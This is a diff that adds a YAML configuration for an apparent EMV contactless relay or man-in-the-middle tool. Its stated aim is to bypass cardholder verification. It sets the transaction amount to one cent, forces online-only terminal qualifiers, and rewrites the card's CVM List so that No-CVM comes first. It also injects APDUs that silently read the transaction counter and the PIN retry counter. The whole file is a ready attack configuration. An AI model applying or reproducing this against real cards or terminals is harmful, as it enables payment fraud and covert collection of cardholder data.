@@ -1,0 +1,52 @@
+# COMBO-A — CVM bypass via contactless amount threshold + silent data collection
+# Enables: 1¢ amount, EUR currency, TTQ online-only, No-CVM CVM list, silent ATC/PIN reads
+enabled: true
+log_mutations: true
+log_path: "logs/mutations.jsonl"
+
+pdol_mutations:
+  - tag:     "9F02"
+    value:   "000000000001"
+    enabled: true
+    comment: "Amount: 1 cent — triggers No-CVM amount threshold rule"
+
+  - tag:     "5F2A"
+    value:   "0978"
+    enabled: true
+    comment: "Currency: EUR (0978) — synchronise with amount"
+
+  - tag:     "9F1A"
+    value:   "0276"
+    enabled: false
+    comment: "Terminal country: Germany (0276)"
+
+  - tag:     "9F66"
+    value:   "36004000"
+    enabled: true
+    comment: "TTQ: online-cryptogram, no offline PIN, no MSD"
+
+afl_mutations: []
+
+dol_mutations: []
+
+response_mutations:
+  - tag:     "8E"
+    mode:    replace
+    value:   "00000000000000001F03"
+    enabled: true
+    comment: "CVM List: No-CVM first"
+
+injected_commands:
+  - trigger_ins: "AE"
+    when:        after_response
+    apdu:        "80CA9F3600"
+    repeat:      false
+    enabled:     true
+    comment:     "Silent ATC read after GenAC"
+
+  - trigger_ins: "A8"
+    when:        after_response
+    apdu:        "80CA9F1700"
+    repeat:      false
+    enabled:     true
+    comment:     "Silent PIN retry counter after GPO"
